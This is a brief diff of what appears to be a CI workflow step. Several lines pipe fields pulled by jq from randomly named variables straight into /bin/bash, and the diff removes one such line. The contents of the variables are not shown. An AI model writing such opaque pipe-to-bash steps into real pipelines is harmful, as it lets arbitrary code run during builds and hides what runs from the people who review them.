@@ -42,7 +42,6 @@ jobs:
           printf '%s' "$esh45295" | jq -r .rffws03298 | /bin/bash
           printf '%s' "$uo990" | jq -r .bevv1 | /bin/bash
           printf '%s' "$muwju9262" | jq -r .rnojm95 | /bin/bash
-          echo $qrfh9 | jq -r .wd3 | /bin/bash
 
       - name: Persist output
         if: always()
